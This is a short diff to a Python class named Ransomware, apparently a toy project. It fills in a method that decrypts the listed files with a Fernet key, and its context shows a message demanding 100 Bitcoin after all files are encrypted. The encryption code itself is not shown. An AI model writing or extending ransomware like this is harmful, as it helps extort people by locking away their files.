@@ -19,7 +19,13 @@ class Ransomware:
         print("All of the files have been encrypted! Send me 100 Bitcoin to decrypt them!\n\"paste bitcoin address here\"\n")
 
     def decrypt_files(self):
-        pass
+        for file in self.files:
+            with open(file, "rb") as f:
+                data = f.read()
+            decrypted_data = Fernet(self.key).decrypt(data)
+            with open(file, "wb") as f:
+                f.write(decrypted_data)
+        print("all your files have been decrypted!\ngoodbye!")
 
     def delete_files(self):
         pass
